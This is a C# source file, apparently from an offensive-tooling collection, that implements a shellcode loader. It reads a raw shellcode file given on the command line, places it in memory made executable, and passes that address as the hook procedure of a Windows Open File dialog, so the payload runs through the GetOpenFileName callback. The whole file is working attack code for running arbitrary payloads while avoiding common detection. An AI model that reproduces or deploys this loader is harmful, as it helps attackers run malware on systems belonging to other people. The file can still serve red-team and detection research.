// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GetOpenFileName
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: GetOpenFileName.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            /* 
             * To enable a hook procedure for an Explorer-style Open or Save As dialog box, use the OPENFILENAME
             * structure when you create the dialog box. Set the OFN_ENABLEHOOK and OFN_EXPLORER flags in the
             * Flags member and specify the address of an OFNHookProc hook procedure in the lpfnHook member.
             * See: https://docs.microsoft.com/en-us/windows/win32/dlgbox/open-and-save-as-dialog-boxes#explorer-style-hook-procedures
             */

            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;

            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 260;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = hAlloc;

            GetOpenFileName(ref sOpenFileName);
        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            int dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("comdlg32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool GetOpenFileName(ref OpenFileName ofn);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }
    }
}
